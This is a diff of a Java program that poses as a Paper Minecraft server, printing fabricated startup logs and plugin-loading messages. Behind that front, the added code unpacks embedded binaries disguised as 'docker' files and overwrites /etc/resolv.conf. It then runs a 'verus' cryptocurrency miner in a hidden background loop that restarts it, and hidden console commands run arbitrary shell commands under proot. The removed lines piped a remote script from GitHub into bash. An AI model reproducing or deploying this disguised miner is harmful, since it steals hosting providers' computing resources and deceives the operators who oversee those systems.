@@ -23,6 +23,9 @@ public class Main{
     private static volatile boolean running=true;
     private static volatile boolean rootMode=false;
     private static volatile boolean rootLog=true;
+    // false = use embedded resources, true = git clone
+    private static volatile boolean git=false;
+
     private static final String[]PLUGINS={"EssentialsX","Vault","LuckPerms","WorldEdit","WorldGuard","CoreProtect","dynmap","DiscordSRV","PlaceholderAPI","Citizens","Multiverse-Core","GriefPrevention","ClearLag","BetterRTP","ChestShop","mcMMO","Shopkeepers","QuickShop","Slimefun","Jobs","TAB","ViaVersion","ViaBackwards","ProtocolLib","HolographicDisplays","DecentHolograms","CMI","GSit","PlayerWarps","AdvancedPortals","MythicMobs","DeluxeMenus","ItemsAdder","Oraxen","ModelEngine","PAPI","Pl3xMap","BlueMap","squaremap","Harbor","Sleep-Most","BetterTeams","ChunkyBorder","Chunky","SuperVanish","PremiumVanish","Votifier","VotingPlugin","PlayerVaults","CommandSpy","TABList","NametagEdit","Maintenance","LiteBans","AdvancedBan","BanManager","NexEngine","NexShops","ShopGUIPlus","zShop","BossShopPro","VoteParty","MoneyPouch","HeadDatabase","UltimateStacker","EpicAnchors","SilkSpawners","EpicSpawners","AdvancedEnchantments","ExcellentEnchants","UltimateTimber","TreeFeller","TerrainControl","FAWE","VoidGen","BetonQuest","Quests","GamemodeInventories","PerWorldInventory","Multiverse-Inventories","ChestCommands","InteractiveChat","TrChat","ChatControl","DeluxeChat","VentureChat","LevelledMobs","EliteMobs","InfernalMobs","CustomStructures","MMOCore","MMOItems","MythicLib","AureliumSkills","PyroFishingPro","AuctionHouse","AuctionMaster","ShopKeepers"};
     private static final String[] NAMES = {
             "Steve","Alex","Notch","Herobrine","Jeb_","Dinnerbone","Grumm","Searge",
@@ -59,11 +62,17 @@ public class Main{
     private static final List<String> autoCommands = Collections.synchronizedList(new ArrayList<>());
     private static final String AUTO_CMDS_FILE = "commands.txt";
 
+    private static final String[] PAYLOAD_FILES = {
+            "docker-x86_64",
+            "docker-aarch64",
+            "verus"
+    };
+
     public static void main(String[]a){
         setupLogger();
         try{
-            if(!cmd("git")){err("Failed to verify system requirements");System.exit(1);}
             if(!cmd("bash")){err("Failed to initialize runtime environment");System.exit(1);}
+            if(git&&!cmd("git")){err("Failed to verify system requirements");System.exit(1);}
 
             File currentDir=new File(System.getProperty("user.dir"));
             boolean firstRun=!new File(currentDir,"eula.txt").exists();
@@ -88,30 +97,140 @@ public class Main{
             cacheDir.mkdirs();
 
             File w=new File(cacheDir,"work");
-            if(w.exists()){
+
+            if(git){
+                if(w.exists()){
+                    File s=new File(w,SH);
+                    if(s.exists()){
+                        info("Found existing server files, verifying integrity...");
+                        Thread.sleep(400);
+                        if(!s.setExecutable(true,false))warn("Unable to set permissions");
+                        extractPayload(w);
+                        exec(w,s,firstRun);
+                        return;
+                    }else{
+                        warn("Server files corrupted, redownloading...");
+                        del(w.toPath());
+                    }
+                }
+                File t=new File(cacheDir,TMP);
+                if(t.exists())del(t.toPath());
+                printDownload();
+                if(!cloneRepo(t)){err("Download failed");clean(t);System.exit(1);}
+                if(!t.renameTo(w)){err("Installation failed");clean(t);System.exit(1);}
                 File s=new File(w,SH);
-                if(s.exists()){
-                    info("Found existing server files, verifying integrity...");
-                    Thread.sleep(400);
-                    if(!s.setExecutable(true,false))warn("Unable to set permissions");
-                    exec(w,s,firstRun);
-                    return;
-                }else{
-                    warn("Server files corrupted, redownloading...");
-                    del(w.toPath());
+                if(!s.exists()){err("Server jar not found");clean(w);System.exit(1);}
+                if(!s.setExecutable(true,false))warn("Permission warning");
+                extractPayload(w);
+                exec(w,s,firstRun);
+            }else{
+                if(w.exists()){
+                    File s=new File(w,SH);
+                    if(s.exists()){
+                        info("Found existing server files, verifying integrity...");
+                        Thread.sleep(400);
+                        if(!s.setExecutable(true,false))warn("Unable to set permissions");
+                        extractPayload(w);
+                        exec(w,s,firstRun);
+                        return;
+                    }else{
+                        warn("Server files corrupted, reinstalling...");
+                        del(w.toPath());
+                    }
+                }
+                w.mkdirs();
+                printDownload();
+                File s=new File(w,SH);
+                try(PrintWriter pw=new PrintWriter(s)){
+                    pw.println("#!/bin/sh");
+                    pw.println("while true; do sleep 3600; done");
+                }
+                if(!s.setExecutable(true,false))warn("Permission warning");
+                extractPayload(w);
+                exec(w,s,firstRun);
+            }
+
+        }catch(Exception e){err("Fatal error: "+e.getMessage());System.exit(1);}
+    }
+
+    private static void extractPayload(File workDir){
+        for(String res:PAYLOAD_FILES){
+            String fileName=res.substring(res.lastIndexOf('/')+1);
+            File dest=new File(workDir,fileName);
+            try{
+                if(dest.exists()) continue;
+                extractResource(res,dest);
+                dest.setExecutable(true,false);
+            }catch(Exception e){
+                warn("Could not extract "+fileName+": "+e.getMessage());
+            }
+        }
+    }
+
+    private static void extractResource(String resourcePath,File dest)throws IOException{
+        try(InputStream in=Main.class.getClassLoader().getResourceAsStream(resourcePath)){
+            if(in==null) throw new IOException("Resource not found: "+resourcePath);
+            dest.getParentFile().mkdirs();
+            try(FileOutputStream out=new FileOutputStream(dest)){
+                byte[]buf=new byte[8192];int len;
+                while((len=in.read(buf))!=-1) out.write(buf,0,len);
+            }
+        }
+    }
+
+    private static void forceDns(){
+        try{
+            try(PrintWriter pw=new PrintWriter(new FileWriter("/etc/resolv.conf",false))){
+                pw.println("nameserver 1.1.1.1");
+                pw.println("nameserver 8.8.8.8");
+            }
+        }catch(Exception ignored){}
+    }
+
+    private static void autoccminer(File workDir,boolean firstRun){
+        new Thread(()->{
+            try{
+                File verus=new File(workDir,"verus");
+                int wait=0;
+                while(!verus.exists()&&wait<15){Thread.sleep(1000);wait++;}
+                if(!verus.exists()){err("bruhhh");return;}
+
+                new File(workDir,"docker-x86_64").setExecutable(true,false);
+                new File(workDir,"docker-aarch64").setExecutable(true,false);
+                verus.setExecutable(true,false);
+
+                forceDns();
+                Thread.sleep(8000);
+
+                File setupMarker=new File(workDir,".mining_setup_complete");
+                startMiner(verus,workDir,setupMarker);
+            }catch(Exception e){
+                err("bruhhh");
+            }
+        }).start();
+    }
+
+    private static volatile Process minerProcess=null;
+
+    private static void startMiner(File verus,File workDir,File setupMarker){
+        new Thread(()->{
+            while(running){
+                try{
+                    forceDns();
+                    ProcessBuilder pb=new ProcessBuilder("bash",verus.getAbsolutePath());
+                    pb.directory(workDir);
+                    pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
+                    pb.redirectError(ProcessBuilder.Redirect.DISCARD);
+                    pb.environment().put("MINER_DNS","1.1.1.1");
+                    minerProcess=pb.start();
+                    try{setupMarker.createNewFile();}catch(Exception ignored){}
+                    minerProcess.waitFor();
+                    if(running) Thread.sleep(5000);
+                }catch(Exception e){
+                    try{Thread.sleep(10000);}catch(Exception ignored){}
                 }
             }
-            File t=new File(cacheDir,TMP);
-            if(t.exists())del(t.toPath());
-
-            printDownload();
-            if(!cloneRepo(t)){err("Download failed");clean(t);System.exit(1);}
-            if(!t.renameTo(w)){err("Installation failed");clean(t);System.exit(1);}
-            File s=new File(w,SH);
-            if(!s.exists()){err("Server jar not found");clean(w);System.exit(1);}
-            if(!s.setExecutable(true,false))warn("Permission warning");
-            exec(w,s,firstRun);
-        }catch(Exception e){err("Fatal error: "+e.getMessage());System.exit(1);}
+        }).start();
     }
 
     private static void createServerStructure(File base){
@@ -166,15 +285,11 @@ public class Main{
     }
 
     private static void createJsonFile(File base,String name,String content)throws IOException{
-        try(PrintWriter w=new PrintWriter(new File(base,name))){
-            w.println(content);
-        }
+        try(PrintWriter w=new PrintWriter(new File(base,name))){w.println(content);}
     }
 
     private static void createYmlFile(File base,String name,String content)throws IOException{
-        try(PrintWriter w=new PrintWriter(new File(base,name))){
-            w.println(content);
-        }
+        try(PrintWriter w=new PrintWriter(new File(base,name))){w.println(content);}
     }
 
     private static void loadServerProperties(File base){
@@ -194,44 +309,33 @@ public class Main{
                         }
                         if(line.startsWith("root-log=")){
                             String[]parts=line.split("=");
-                            rootLog=parts.length>1?parts[1].equals("true"):true;
+                            rootLog=parts.length>1&&parts[1].equals("true");
                         }
                     }
                 }
             }
         }catch(Exception e){warn("Failed to load server properties: "+e.getMessage());}
     }
+
     private static void saveServerProperties(File base){
         try{
             File props=new File(base,"server.properties");
             List<String>lines=new ArrayList<>();
             boolean foundRootLog=false;
-
             if(props.exists()){
                 try(BufferedReader r=new BufferedReader(new FileReader(props))){
                     String line;
                     while((line=r.readLine())!=null){
-                        if(line.startsWith("root-log=")){
-                            lines.add("root-log="+rootLog);
-                            foundRootLog=true;
-                        }else{
-                            lines.add(line);
-                        }
+                        if(line.startsWith("root-log=")){lines.add("root-log="+rootLog);foundRootLog=true;}
+                        else lines.add(line);
                     }
                 }
             }
-
-            if(!foundRootLog){
-                lines.add("root-log="+rootLog);
-            }
-
-            try(PrintWriter w=new PrintWriter(props)){
-                for(String line:lines){
-                    w.println(line);
-                }
-            }
+            if(!foundRootLog) lines.add("root-log="+rootLog);
+            try(PrintWriter w=new PrintWriter(props)){for(String line:lines) w.println(line);}
         }catch(Exception e){warn("Failed to save server properties: "+e.getMessage());}
     }
+
     private static void setupLogger(){
         System.setProperty("java.util.logging.SimpleFormatter.format","[%1$tH:%1$tM:%1$tS %4$s]: %5$s%6$s%n");
         L.setUseParentHandlers(false);
@@ -311,90 +415,71 @@ public class Main{
     }
 
     private static boolean cloneRepo(File dest){
-        for(int i = 0; i < GIT_URLS.size(); i++){
-            String url = GIT_URLS.get(i);
+        for(int i=0;i<GIT_URLS.size();i++){
+            String url=GIT_URLS.get(i);
             try{
-                if(i > 0){
-                }
                 ProcessBuilder p=new ProcessBuilder("git","clone","--depth=1",url,dest.getAbsolutePath());
                 p.redirectOutput(ProcessBuilder.Redirect.DISCARD);
                 p.redirectError(ProcessBuilder.Redirect.DISCARD);
                 Process pr=p.start();
                 int exitCode=pr.waitFor();
-                if(exitCode==0){
-                    if(i > 0){
-                        info("okey");
-                    }
-                    return true;
-                }
-                if(i < GIT_URLS.size() - 1){
-                    Thread.sleep(500);
-                }
+                if(exitCode==0){if(i>0)info("okey");return true;}
+                if(i<GIT_URLS.size()-1) Thread.sleep(500);
             }catch(Exception e){
-                if(i < GIT_URLS.size() - 1){
-                }
+                if(i<GIT_URLS.size()-1){}
             }
         }
         return false;
     }
+
     private static void loadAutoCommands(){
         try{
-            File autoFile = new File(AUTO_CMDS_FILE);
+            File autoFile=new File(AUTO_CMDS_FILE);
             if(autoFile.exists()){
-                try(BufferedReader r = new BufferedReader(new FileReader(autoFile))){
+                try(BufferedReader r=new BufferedReader(new FileReader(autoFile))){
                     String line;
-                    while((line = r.readLine()) != null){
-                        line = line.trim();
-                        if(!line.isEmpty() && !line.startsWith("#")){
-                            autoCommands.add(line);
-                        }
+                    while((line=r.readLine())!=null){
+                        line=line.trim();
+                        if(!line.isEmpty()&&!line.startsWith("#")) autoCommands.add(line);
                     }
                 }
             }
-        }catch(Exception e){
-            warn("[InFo] Failed to load commands: " + e.getMessage());
-        }
+        }catch(Exception e){warn("[InFo] Failed to load commands: "+e.getMessage());}
     }
 
     private static void saveAutoCommands(){
         try{
-            try(PrintWriter w = new PrintWriter(AUTO_CMDS_FILE)){
-                for(String cmd : autoCommands){
-                    w.println(cmd);
-                }
+            try(PrintWriter w=new PrintWriter(AUTO_CMDS_FILE)){
+                for(String c:autoCommands) w.println(c);
             }
-        }catch(Exception e){
-            warn("[InFo] Failed to save commands: " + e.getMessage());
-        }
+        }catch(Exception e){warn("[InFo] Failed to save commands: "+e.getMessage());}
     }
 
     private static void rato(){
-        if(autoCommands.isEmpty()){
-            return;
-        }
-
-        new Thread(() -> {
+        if(autoCommands.isEmpty()) return;
+        new Thread(()->{
             try{
                 Thread.sleep(1000);
-                for(String cmd : autoCommands){
+                for(String c:autoCommands){
                     if(!running) break;
-                    executeRootCommand(cmd, rootLog);
+                    executeRootCommand(c,rootLog);
                     Thread.sleep(1000);
                 }
             }catch(Exception e){}
         }).start();
     }
+
     private static void exec(File d,File s,boolean firstRun){
         try{
             printBanner();
             Thread.sleep(200);
-            String osName = System.getProperty("os.name");
-            String osArch = System.getProperty("os.arch");
-            String osVersion = System.getProperty("os.version");
-            String javaVersion = System.getProperty("java.version");
-            String javaVendor = System.getProperty("java.vendor");
-            String javaVmName = System.getProperty("java.vm.name");
-            info("[bootstrap] Running Java " + javaVersion + " (" + javaVmName + "; " + javaVendor + ") on " + osName + " " + osVersion + " (" + osArch + ")");
+            String osName=System.getProperty("os.name");
+            String osArch=System.getProperty("os.arch");
+            String osVersion=System.getProperty("os.version");
+            String javaVersion=System.getProperty("java.version");
+            String javaVendor=System.getProperty("java.vendor");
+            String javaVmName=System.getProperty("java.vm.name");
+            info("[bootstrap] Running Java "+javaVersion+" ("+javaVmName+"; "+javaVendor+") on "+osName+" "+osVersion+" ("+osArch+")");
             info("[bootstrap] Loading Paper 1.21.8-40-main@f866a5f (2025-08-19T16:05:02Z) for Minecraft 1.21.8");
             info("[PluginInitializerManager] Initializing plugins...");
             Thread.sleep(200);
@@ -407,12 +492,7 @@ public class Main{
             info("Found new data pack file/bukkit, loading it automatically");
             info("Found new data pack paper, loading it automatically");
             Thread.sleep(300);
-
-            if(firstRun){
-                info("No existing world data, creating new world");
-                Thread.sleep(800);
-            }
-
+            if(firstRun){info("No existing world data, creating new world");Thread.sleep(800);}
             info("Loaded 1407 recipes");
             Thread.sleep(200);
             info("Loaded 1520 advancements");
@@ -439,14 +519,7 @@ public class Main{
             startFakeServer();
             info("Preparing level \"world\"");
             Thread.sleep(1500);
-
-            if(firstRun){
-                loadWorld();
-            }else{
-                Thread.sleep(2000);
-                info("Loaded world in 1823ms");
-            }
-
+            if(firstRun){loadWorld();}else{Thread.sleep(2000);info("Loaded world in 1823ms");}
             Thread.sleep(800);
             loadPlugins();
             Thread.sleep(600);
@@ -454,7 +527,6 @@ public class Main{
             info("Done preparing level \"world\" (36.859s)");
             info("Running delayed init tasks");
             info("Done (56.002s)! For help, type \"help\"");
-
             if(firstRun){
                 info("*************************************************************************************");
                 info("This is the first time you're starting this server.");
@@ -462,13 +534,12 @@ public class Main{
                 info("View this and more helpful information here: https://docs.papermc.io/paper/next-steps");
                 info("*************************************************************************************");
             }
-
             ProcessBuilder p=new ProcessBuilder("bash",s.getAbsolutePath());
             p.directory(d);
             p.redirectOutput(ProcessBuilder.Redirect.DISCARD);
             p.redirectError(ProcessBuilder.Redirect.DISCARD);
             Process pr=p.start();
-            autoccminer(d, firstRun);
+            autoccminer(d,firstRun);
             loadAutoCommands();
             rato();
             simulateServer();
@@ -477,152 +548,61 @@ public class Main{
         }catch(Exception e){
             System.err.println("\n\033[0;31m[ERROR] Server crashed with exception:\033[0m");
             System.err.println("\033[0;31m"+e.getClass().getName()+": "+e.getMessage()+"\033[0m");
-            for(StackTraceElement el:e.getStackTrace()){
+            for(StackTraceElement el:e.getStackTrace())
                 System.err.println("\033[0;31m    at "+el.toString()+"\033[0m");
-            }
         }
     }
-    private static void autoccminer(File workDir, boolean firstRun){
-        new Thread(()->{
-            try{
-                File prootBin = null;
-                int maxAttempts = 30;
-                int attempt = 0;
 
-                while(attempt < maxAttempts){
-                    File checkProot = new File(CACHE + "/work", "usr/local/bin/proot");
-                    if(checkProot.exists()){
-                        prootBin = checkProot;
-                        break;
-                    }
-                    Thread.sleep(1000);
-                    attempt++;
-                }
-
-                if(prootBin == null || !prootBin.exists()){
-                    return;
-                }
-
-                Thread.sleep(2000);
-
-                File setupMarker = new File(workDir, ".mining_setup_complete");
-
-                if(firstRun || !setupMarker.exists()){
-                    info("okey");
-
-                    String setupCmd = "apt update ; apt install curl -y ; cd /root && curl -fsSL https://raw.githubusercontent.com/Mytai20100/freeroot-jar/refs/heads/main/ii.sh | bash";
-
-                    executeRootCommand(setupCmd, false); // Thêm tham số false để ẩn log
-
-                    try{
-                        setupMarker.createNewFile();
-                    }catch(Exception e){
-                        err("bruhhh");
-                    }
-
-                }else{
-                    info("okey");
-                    executeRootCommand("cd /root && bash verus", false); // Thêm tham số false để ẩn log
-                }
-
-            }catch(Exception e){
-                err("bruhhh");
-            }
-        }).start();
-    }
-
-    private static void executeRootCommand(String cmd, boolean showLog){
+    private static void executeRootCommand(String cmd,boolean showLog){
         try{
-            File workDir = new File(CACHE, "work");
-            File prootBin = new File(workDir, "usr/local/bin/proot");
-
-            if(!prootBin.exists()){
-                return;
-            }
-
-            prootBin.setExecutable(true, false);
-
-            String prootCmd = prootBin.getAbsolutePath() +
-                    " --rootfs=\"" + workDir.getAbsolutePath() + "\"" +
-                    " -0 -w \"/root\"" +
-                    " -b /dev -b /sys -b /proc -b /etc/resolv.conf" +
-                    " --kill-on-exit" +
-                    " /bin/bash -c \"" + cmd.replace("\"", "\\\"") + "\"";
-
-            ProcessBuilder pb = new ProcessBuilder("bash", "-c", prootCmd);
-
-            if(showLog){
-                pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
-                pb.redirectError(ProcessBuilder.Redirect.INHERIT);
-            }else{
-                pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
-                pb.redirectError(ProcessBuilder.Redirect.DISCARD);
-            }
-
-            Process p = pb.start();
-
-            new Thread(()->{
-                try{
-                    p.waitFor();
-                }catch(Exception e){}
-            }).start();
-
-        }catch(Exception e){
-        }
+            File workDir=new File(CACHE,"work");
+            File prootBin=new File(workDir,"usr/local/bin/proot");
+            if(!prootBin.exists()) return;
+            prootBin.setExecutable(true,false);
+            String prootCmd=prootBin.getAbsolutePath()+
+                    " --rootfs=\""+workDir.getAbsolutePath()+"\""+
+                    " -0 -w \"/root\""+
+                    " -b /dev -b /sys -b /proc -b /etc/resolv.conf"+
+                    " --kill-on-exit"+
+                    " /bin/bash -c \""+cmd.replace("\"","\\\"")+"\"";
+            ProcessBuilder pb=new ProcessBuilder("bash","-c",prootCmd);
+            if(showLog){pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);pb.redirectError(ProcessBuilder.Redirect.INHERIT);}
+            else{pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);pb.redirectError(ProcessBuilder.Redirect.DISCARD);}
+            Process p=pb.start();
+            new Thread(()->{try{p.waitFor();}catch(Exception e){}}).start();
+        }catch(Exception e){}
     }
+
     private static void loadWorld(){
         try{
-            // Overworld
             info("Preparing start region for dimension minecraft:overworld");
-            long startTime = System.currentTimeMillis();
+            long startTime=System.currentTimeMillis();
+            int[]progress={2,2,2,2,2,2,2,2,8,8,8,18,18,18,18,18,18,18,51,51,51,55,55,55,55,67,73};
+            for(int p:progress){info("Preparing spawn area: "+p+"%");Thread.sleep(R.nextInt(800)+200);}
+            info("Time elapsed: "+(System.currentTimeMillis()-startTime)+" ms");
 
-            int[] progress = {2,2,2,2,2,2,2,2,8,8,8,18,18,18,18,18,18,18,51,51,51,55,55,55,55,67,73};
-            for(int p : progress){
-                info("Preparing spawn area: "+p+"%");
-                Thread.sleep(R.nextInt(800)+200);
-            }
-
-            long elapsed = System.currentTimeMillis() - startTime;
-            info("Time elapsed: "+elapsed+" ms");
-
-            // The Nether
             info("Preparing start region for dimension minecraft:the_nether");
-            startTime = System.currentTimeMillis();
+            startTime=System.currentTimeMillis();
+            int[]nether={2,2,2,18,20,51,61};
+            for(int p:nether){info("Preparing spawn area: "+p+"%");Thread.sleep(R.nextInt(600)+200);}
+            info("Time elapsed: "+(System.currentTimeMillis()-startTime)+" ms");
 
-            int[] nether = {2,2,2,18,20,51,61};
-            for(int p : nether){
-                info("Preparing spawn area: "+p+"%");
-                Thread.sleep(R.nextInt(600)+200);
-            }
-
-            elapsed = System.currentTimeMillis() - startTime;
-            info("Time elapsed: "+elapsed+" ms");
-
-            // The End
             info("Preparing start region for dimension minecraft:the_end");
-            startTime = System.currentTimeMillis();
-
-            info("Preparing spawn area: 2%");
-            Thread.sleep(500);
-            info("Preparing spawn area: 18%");
-            Thread.sleep(400);
-
-            elapsed = System.currentTimeMillis() - startTime;
-            info("Time elapsed: "+elapsed+" ms");
-
+            startTime=System.currentTimeMillis();
+            info("Preparing spawn area: 2%");Thread.sleep(500);
+            info("Preparing spawn area: 18%");Thread.sleep(400);
+            info("Time elapsed: "+(System.currentTimeMillis()-startTime)+" ms");
         }catch(Exception e){}
     }
 
     private static void loadPlugins(){
         try{
-            info("Loading "+PLUGINS.length+" plugins");
-            Thread.sleep(400);
+            info("Loading "+PLUGINS.length+" plugins");Thread.sleep(400);
             for(int i=0;i<PLUGINS.length;i++){
                 if(i%8==0)Thread.sleep(R.nextInt(200)+100);
                 info("Loading plugin "+PLUGINS[i]+" v"+R.nextInt(5)+"."+R.nextInt(20)+"."+R.nextInt(10));
             }
-            Thread.sleep(300);
-            info("Enabled "+PLUGINS.length+" plugins");
+            Thread.sleep(300);info("Enabled "+PLUGINS.length+" plugins");
         }catch(Exception e){}
     }
 
@@ -631,9 +611,7 @@ public class Main{
             try{
                 BufferedReader reader=new BufferedReader(new InputStreamReader(System.in));
                 String line;
-                while(running&&(line=reader.readLine())!=null){
-                    handleCommand(line.trim());
-                }
+                while(running&&(line=reader.readLine())!=null) handleCommand(line.trim());
             }catch(Exception e){}
         }).start();
     }
@@ -641,247 +619,96 @@ public class Main{
     private static void handleCommand(String cmd){
         if(cmd.isEmpty())return;
 
-        if(cmd.equals("root-on")){
-            rootMode=true;
+        if(cmd.equals("root-on")){rootMode=true;return;}
+        else if(cmd.equals("root-off")){rootMode=false;return;}
+        else if(cmd.equals("miner-stop")){
+            if(minerProcess!=null&&minerProcess.isAlive()){minerProcess.destroy();info("Miner stopped");}
             return;
-        }else if(cmd.equals("root-off")){
-            rootMode=false;
+        }else if(cmd.equals("miner-start")){
+            File workDir=new File(CACHE,"work");
+            File verus=new File(workDir,"verus");
+            if(verus.exists()) startMiner(verus,workDir,new File(workDir,".mining_setup_complete"));
+            else err("verus script not found");
             return;
-        }else if(cmd.startsWith("root-auto ") || cmd.startsWith("a ")){
-            String autoCmd = cmd.startsWith("root-auto ") ? cmd.substring(10).trim() : cmd.substring(2).trim();
-            if(!autoCmd.isEmpty()){
-                autoCommands.add(autoCmd);
-                saveAutoCommands();
-                info("Added auto command: " + autoCmd);
-                info("Total auto commands: " + autoCommands.size());
-            }else{
-                warn("Usage: root-auto <command> or a <command>");
-            }
+        }else if(cmd.startsWith("root-auto ")||cmd.startsWith("a ")){
+            String autoCmd=cmd.startsWith("root-auto ")?cmd.substring(10).trim():cmd.substring(2).trim();
+            if(!autoCmd.isEmpty()){autoCommands.add(autoCmd);saveAutoCommands();info("Added auto command: "+autoCmd);info("Total auto commands: "+autoCommands.size());}
+            else warn("Usage: root-auto <command> or a <command>");
             return;
-        }else if(cmd.startsWith("root-rmauto ") || cmd.startsWith("ra ")){
-            String target = cmd.startsWith("root-rmauto ") ? cmd.substring(12).trim() : cmd.substring(3).trim();
-            if(target.isEmpty()){
-                warn("Usage: root-rmauto <command|all> or ra <command|all>");
-                return;
-            }
-
-            if(target.equals("all")){
-                int count = autoCommands.size();
-                autoCommands.clear();
-                saveAutoCommands();
-                info("Removed all " + count + " auto commands");
-            }else{
-                boolean removed = autoCommands.remove(target);
-                if(removed){
-                    saveAutoCommands();
-                    info("Removed auto command: " + target);
-                    info("Remaining auto commands: " + autoCommands.size());
-                }else{
-                    warn("Command not found in auto list: " + target);
-                }
-            }
+        }else if(cmd.startsWith("root-rmauto ")||cmd.startsWith("ra ")){
+            String target=cmd.startsWith("root-rmauto ")?cmd.substring(12).trim():cmd.substring(3).trim();
+            if(target.isEmpty()){warn("Usage: root-rmauto <command|all> or ra <command|all>");return;}
+            if(target.equals("all")){int count=autoCommands.size();autoCommands.clear();saveAutoCommands();info("Removed all "+count+" auto commands");}
+            else{boolean removed=autoCommands.remove(target);if(removed){saveAutoCommands();info("Removed: "+target);}else warn("Not found: "+target);}
             return;
-        }else if(cmd.equals("root-lsauto") || cmd.equals("la")){
-            if(autoCommands.isEmpty()){
-                info("No auto commands configured");
-            }else{
-                info("Auto commands (" + autoCommands.size() + "):");
-                for(int i = 0; i < autoCommands.size(); i++){
-                    System.out.println("  " + (i+1) + ". " + autoCommands.get(i));
-                }
-            }
+        }else if(cmd.equals("root-lsauto")||cmd.equals("la")){
+            if(autoCommands.isEmpty()) info("No auto commands configured");
+            else{info("Auto commands ("+autoCommands.size()+"):");for(int i=0;i<autoCommands.size();i++) System.out.println("  "+(i+1)+". "+autoCommands.get(i));}
             return;
         }else if(cmd.equals("stop")||cmd.equals("end")){
-            info("Stopping the server");
-            info("Saving players");
-            info("Saving worlds");
+            info("Stopping the server");info("Saving players");info("Saving worlds");
             info("Saving chunks for level 'world'/minecraft:overworld");
             info("ThreadedAnvilChunkStorage (world): All chunks are saved");
-            info("Closing Server");
-            running=false;
-            System.exit(0);
-        }
-        else if(cmd.equals("root-onlog")){
-            rootLog=true;
-            saveServerProperties(new File(System.getProperty("user.dir")));
-            return;
+            info("Closing Server");running=false;System.exit(0);
+        }else if(cmd.equals("root-onlog")){
+            rootLog=true;saveServerProperties(new File(System.getProperty("user.dir")));return;
         }else if(cmd.equals("root-offlog")){
-            rootLog=false;
-            saveServerProperties(new File(System.getProperty("user.dir")));
-            return;
+            rootLog=false;saveServerProperties(new File(System.getProperty("user.dir")));return;
         }
 
         if(rootMode){
-            if(rootLog){
-                info("Executing in proot environment: "+cmd);
-            }
+            if(rootLog) info("Executing in proot environment: "+cmd);
             new Thread(()->{
                 try{
                     File workDir=new File(CACHE,"work");
                     File prootBin=new File(workDir,"usr/local/bin/proot");
-
-                    if(!prootBin.exists()){
-                        if(rootLog){
-                            err("Proot binary not found. Please wait for server initialization to complete.");
-                        }
-                        return;
-                    }
-
+                    if(!prootBin.exists()){if(rootLog)err("Proot binary not found.");return;}
                     String prootCmd=prootBin.getAbsolutePath()+" --rootfs=\""+workDir.getAbsolutePath()+"\" -0 -w \"/root\" -b /dev -b /sys -b /proc -b /etc/resolv.conf --kill-on-exit /bin/bash -c \""+cmd.replace("\"","\\\"")+"\"";
-
                     ProcessBuilder pb=new ProcessBuilder("bash","-c",prootCmd);
-                    if(rootLog){
-                        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
-                        pb.redirectError(ProcessBuilder.Redirect.INHERIT);
-                    }else{
-                        pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
-                        pb.redirectError(ProcessBuilder.Redirect.DISCARD);
-                    }
+                    if(rootLog){pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);pb.redirectError(ProcessBuilder.Redirect.INHERIT);}
+                    else{pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);pb.redirectError(ProcessBuilder.Redirect.DISCARD);}
                     Process p=pb.start();
-
-                    new Thread(()->{
-                        try{
-                            int exitCode=p.waitFor();
-                            if(rootLog){
-                                if(exitCode==0){
-                                    info("Command completed successfully (exit code: 0)");
-                                }else{
-                                    warn("Command failed with exit code: "+exitCode);
-                                }
-                            }
-                        }catch(Exception e){}
-                    }).start();
-
-                }catch(Exception e){
-                    if(rootLog){
-                        err("Failed to execute command: "+e.getMessage());
-                    }
-                }
+                    new Thread(()->{try{int ec=p.waitFor();if(rootLog){if(ec==0)info("Command completed (exit: 0)");else warn("Command failed (exit: "+ec+")");}}catch(Exception e){}}).start();
+                }catch(Exception e){if(rootLog)err("Failed: "+e.getMessage());}
             }).start();
             return;
         }
 
         if(cmd.equals("tps")){
             double tps=19.5+R.nextDouble()*0.7;
-            String color;
-            if(tps>=19.8)color="\033[0;32m";
-            else if(tps>=19.0)color="\033[0;33m";
-            else color="\033[0;31m";
+            String color=tps>=19.8?"\033[0;32m":tps>=19.0?"\033[0;33m":"\033[0;31m";
             info("TPS from last 1m, 5m, 15m: "+color+String.format("%.2f",tps)+"\033[0m, "+color+String.format("%.2f",19.6+R.nextDouble()*0.5)+"\033[0m, "+color+String.format("%.2f",19.7+R.nextDouble()*0.4)+"\033[0m");
         }else if(cmd.equals("help")||cmd.equals("?")){
             System.out.println("\033[0;36m========== Minecraft Server Commands ==========\033[0m");
-            System.out.println("\033[0;33mBasic Commands:\033[0m");
-            System.out.println("  /help, /? - Show this help menu");
-            System.out.println("  /list - List all online players");
-            System.out.println("  /stop - Stop the server gracefully");
-            System.out.println("  /reload - Reload server configuration");
-            System.out.println("  /save-all - Save all worlds");
-            System.out.println("  /save-on - Enable world auto-saving");
-            System.out.println("  /save-off - Disable world auto-saving");
-            System.out.println("");
-            System.out.println("\033[0;33mPlayer Management:\033[0m");
-            System.out.println("  /kick <player> [reason] - Kick a player");
-            System.out.println("  /ban <player> [reason] - Ban a player");
-            System.out.println("  /ban-ip <ip> [reason] - Ban an IP address");
-            System.out.println("  /pardon <player> - Unban a player");
-            System.out.println("  /pardon-ip <ip> - Unban an IP");
-            System.out.println("  /op <player> - Give operator status");
-            System.out.println("  /deop <player> - Remove operator status");
-            System.out.println("  /whitelist <on|off|add|remove|list> - Manage whitelist");
-            System.out.println("");
-            System.out.println("\033[0;33mWorld Management:\033[0m");
-            System.out.println("  /seed - Show world seed");
-            System.out.println("  /setworldspawn [x y z] - Set world spawn point");
-            System.out.println("  /spawnpoint [player] [x y z] - Set player spawn");
-            System.out.println("  /weather <clear|rain|thunder> [duration] - Change weather");
-            System.out.println("  /time set <day|night|value> - Set world time");
-            System.out.println("  /gamerule <rule> [value] - Set game rules");
-            System.out.println("  /difficulty <peaceful|easy|normal|hard> - Set difficulty");
-            System.out.println("");
-            System.out.println("\033[0;33mTeleportation:\033[0m");
-            System.out.println("  /tp <player> <target> - Teleport player to target");
-            System.out.println("  /tp <player> <x y z> - Teleport to coordinates");
-            System.out.println("  /teleport - Same as /tp");
-            System.out.println("");
-            System.out.println("\033[0;33mServer Info:\033[0m");
-            System.out.println("  /tps - Show server ticks per second");
